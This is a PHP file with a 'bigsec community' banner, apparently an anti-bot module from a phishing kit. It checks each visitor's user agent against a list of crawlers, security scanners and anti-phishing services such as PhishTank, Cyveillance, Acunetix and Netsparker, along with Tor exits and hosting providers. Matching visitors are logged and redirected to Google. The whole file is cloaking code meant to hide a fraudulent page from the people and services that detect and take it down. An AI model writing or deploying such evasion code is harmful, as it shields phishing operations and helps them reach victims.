<?php
/*
       t . m e / b i g s e c c o m m u n i t y 

   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
 ███   ███   ███   ███    ███   ███    ███   ███    █▀  
 ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
 ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
 ███   ███   ███   ███    ███ ▀███████████          ███ 
 ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
                                ███    ███              

 M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
 */

$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "tor-exit",
	 "apache-httpclient",
	 "lssrocketcrawler",
	 "crawler",
	 "urlredirectresolver",
	 "jetbrains",
	 "spam",
	 "windows 95",
	 "windows 98",
	 "acunetix",
	 "netsparker",
	 "007ac9",
	 "008",
	 "192.comagent",
	 "200pleasebot",
	 "360spider",
	 "4seohuntbot",
	 "50.nu",
	 "a6-indexer",
	 "admantx",
	 "amznkassocbot",
	 "aboundexbot",
	 "aboutusbot",
	 "abrave spider",
	 "accelobot",
	 "acoonbot",
	 "addthis.com",
	 "adsbot-google",
	 "ahrefsbot",
	 "alexabot",
	 "amagit.com",
	 "analytics",
	 "antbot",
	 "apercite",
	 "aportworm",
	 "EBAY",
	 "CL0NA",
	 "jabber",
	 "ebay",
	 "arabot",
	 "hotmail!",
	 "msn!",
	 "outlook!",
	 "outlook",
	 "msn",
	 "hotmail",
);

foreach($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "	") {
		$content = "AntiBots => ".$dp." [ agent ] \n";
		$save=fopen("bots.txt","a+");
	    fwrite($save,$content);
	    fclose($save);
		header("Location: http://www.google.com/");exit();
    }  
}
